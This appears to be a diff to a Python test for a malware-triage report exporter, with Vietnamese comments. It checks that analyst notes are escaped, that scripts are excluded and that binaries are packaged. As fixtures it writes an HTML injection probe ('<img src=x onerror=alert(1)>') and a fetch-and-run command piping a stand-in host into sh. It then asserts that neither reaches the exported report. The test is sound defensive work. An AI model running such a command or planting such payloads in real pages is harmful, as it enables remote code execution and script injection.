@@ -17,7 +17,9 @@ def w(p, b):
 try:
     inbox = os.path.join(T, 'IN'); smp = b'\x7fELF' + b'\x02' * 60; h = hashlib.sha256(smp).hexdigest()
     src = w(os.path.join(inbox, 'U1', 'a', 'x.bin'), smp); dup = w(os.path.join(inbox, 'U2', 'y.bin'), smp)
-    note = w(os.path.join(inbox, 'U1', 'a', 'x.txt'), '# host=m1 ip=10.0.0.9 at=2026-01-01\n$ ls -la /usr/lib/x\n' + h + '  /usr/lib/x\n<script>alert(1)</script>\n')
+    note = w(os.path.join(inbox, 'U1', 'a', 'x.txt'), '# host=m1|<b>x</b> ip=10.0.0.9 at=2026-01-01\n$ ls -la /usr/lib/x\n' + h + '  /usr/lib/x\n<img src=x onerror=alert(1)>\n')
+    scr = w(os.path.join(inbox, 'U1', 'a', 'x.log'), 'curl http://bad.test/p | sh\n')   # tên giống ghi chú nhưng là script: không gom, không chép rõ
+    sums2 = w(os.path.join(inbox, 'U2', 'SHA256SUMS'), h + '  y.bin\n')                # cùng tên ở thư mục khác: không đè nhau
     sums = w(os.path.join(inbox, 'U1', 'a', 'SHA256SUMS'), h + '  x.bin\n' + '0' * 64 + '  other\n')
     c = os.path.join(T, 'ws', 'x_' + h[:8])
     w(os.path.join(c, 'work', 'sample', 'x.bin'), smp)
@@ -27,6 +29,7 @@ try:
     w(os.path.join(c, 'work', 'runs', 'triage.txt'), 'triage ok\n')
     w(os.path.join(c, 'work', 'ghidra', 'p.gpr'), 'ghidra'); w(os.path.join(c, 'work', 'scripts', '.claude', 'x.json'), '{}')
     w(os.path.join(c, 'work', '.watch.lock'), '')
+    w(os.path.join(c, 'work', 'runs', 'mixed.txt'), b'text ' * 20000 + b'\x00\x01MZ')                # text ở đầu, nhị phân phía sau: gói
     w(os.path.join(c, 'facts.jsonl'), json.dumps({'id': 's.ft', 'kind': 'filetype', 'value': 'ELF x86-64', 'src': 'S', 'evidence': 'report/evidence/e.txt#L1',
                                                   'status': 'active', 'verified_by': '', 'supersedes': '', 'stage': '', 'note': '', 'ts': '2026-01-01T00:00:00'}) + '\n')
     w(os.path.join(c, 'report', 'evidence', 'e.txt'), 'ELF x86-64\n')
@@ -35,21 +38,22 @@ try:
     st = {'source': src, 'inbox': inbox, 'sha256': h}
     out = os.path.join(T, 'Report'); d = os.path.join(out, 'x.bin_data')
     info = export.write(c, st, d)
-    assert info['aliases'] == [dup] and [n['file'] for n in info['notes']] == [note] and info['sums'][0][1] == [h + '  x.bin'], info
+    assert info['aliases'] == [dup] and [n['file'] for n in info['notes']] == [note] and sorted(p for p, _ in info['sums']) == [sums, sums2], info
     assert info['ftype'] == 'ELF x86-64' and info['notes'][0]['sha'] == 'khớp' and info['notes'][0]['path'] == '/usr/lib/x', info['notes']
     P = sorted(json.load(open(LIST)))
-    assert P == sorted(['work/sample/x.bin', 'work/extract/stage2.ps1', 'work/runs/emu/snap_oep.bin', 'work/stage1.bin']), P
+    assert P == sorted(['work/sample/x.bin', 'work/extract/stage2.ps1', 'work/runs/emu/snap_oep.bin', 'work/stage1.bin', 'work/runs/mixed.txt']), P
     files = sorted(os.path.relpath(os.path.join(dp, n), d) for dp, _, ns in os.walk(d) for n in ns)
     assert not any(f.startswith(('work/sample', 'work/extract', 'work/ghidra')) or '.claude' in f or f.endswith(('snap_oep.bin', 'stage1.bin', '.watch.lock')) for f in files), files
     assert {'work/runs/triage.txt', 'facts.jsonl', 'report/evidence/e.txt', 'x.bin.md', 'x.bin.html', 'README.txt', 'MANIFEST.sha256', export.ZIP,
-            'ghi_chu_thu_mau/x.txt', 'ghi_chu_thu_mau/SHA256SUMS'} <= set(files), files
+            'ghi_chu_thu_mau/U1/a/x.txt', 'ghi_chu_thu_mau/U1/a/SHA256SUMS', 'ghi_chu_thu_mau/U2/SHA256SUMS'} <= set(files), files
+    assert not any(f.endswith('x.log') for f in files), files
     first = open(os.path.join(d, 'README.txt'), encoding='utf-8').readline(); assert f'(sha256 {h})' in first and export.ours(d), first
     man = open(os.path.join(d, 'MANIFEST.sha256'), encoding='utf-8').read(); assert f'{h}  {export.ZIP}:work/sample/x.bin' in man, man
     md = open(os.path.join(d, 'x.bin.md'), encoding='utf-8').read()
     assert md.index('## Thông tin mẫu') < md.index('## 1. Tóm tắt') and '(report/evidence/e.txt#L1)' in md and f'({export.ZIP})' in md and '(https://x.test/a)' in md, md
-    assert 'U2/y.bin' in md and 'host=m1' in md, md
+    assert 'U2/y.bin' in md and 'host=m1\\|&lt;b&gt;x&lt;/b&gt;' in md and '<b>' not in md and '<img' not in md and 'bad.test' not in md, md
     ht = open(os.path.join(d, 'x.bin.html'), encoding='utf-8').read()
-    assert 'id="thong-tin-mau"' in ht and 'href="report/evidence/e.txt#L1"' in ht and '&lt;script&gt;' in ht and '<script>alert' not in ht and 'href="#thong-tin-mau"' in ht, ht
+    assert 'id="thong-tin-mau"' in ht and 'href="report/evidence/e.txt#L1"' in ht and '&lt;img src=x' in ht and '<img' not in ht and 'bad.test' not in ht and 'href="#thong-tin-mau"' in ht, ht
     import watch  # noqa: E402  reported() đọc dòng đầu README.txt do export ghi
     assert watch.reported(out) == {h}
     # xuất lại: làm mới thư mục của mình; thư mục lạ trùng tên thì không xóa
